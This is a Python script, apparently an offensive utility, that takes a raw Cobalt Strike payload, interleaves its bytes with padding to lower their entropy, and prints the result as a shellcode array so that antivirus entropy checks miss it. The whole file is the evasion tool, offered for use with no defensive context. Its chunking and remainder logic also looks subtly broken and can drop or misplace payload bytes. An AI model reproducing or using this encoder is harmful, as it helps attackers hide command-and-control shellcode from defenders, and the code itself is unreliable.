import random
import math

#this is a raw cobalt strike payload (high entropy: size 891)
file = open("payload.bin", 'rb')
contents = file.read()
file.close()

payload = []
for b in range(len(contents)):
    test = contents[b]
    payload.append("{:02x}".format(test))

number_of_chunks = 5 #change the number to your needs (optional)
chunk_size = math.floor(len(payload) / number_of_chunks)
remaining_bytes = chunk_size % number_of_chunks

def printShellcode(lowentropyShellcode):
    count = 0
    output = ""
    for x in lowentropyShellcode:
        if count < len(lowentropyShellcode)-1:
            output += "0x{},".format(x)
        else:
            output += "0x{}".format(x)
        count += 1

    print(output)

def shannonEncode(rawShellcode):
    shellcodeOffset = 0
    lowEntropyShellcode = []

    for i in range(0, number_of_chunks):
        for j in range(0, chunk_size-1):
            lowEntropyShellcode.append(rawShellcode[shellcodeOffset])
            shellcodeOffset+=1


        for k in range(0, chunk_size):
            lowEntropyShellcode.append("2A")
    
    if (remaining_bytes):
        for i in range(0, remaining_bytes):
            shellcodeOffset+=1
            lowEntropyShellcode.append(rawShellcode[shellcodeOffset])
    
    return lowEntropyShellcode

lowentropyShellcode = shannonEncode(payload)
printShellcode(lowentropyShellcode)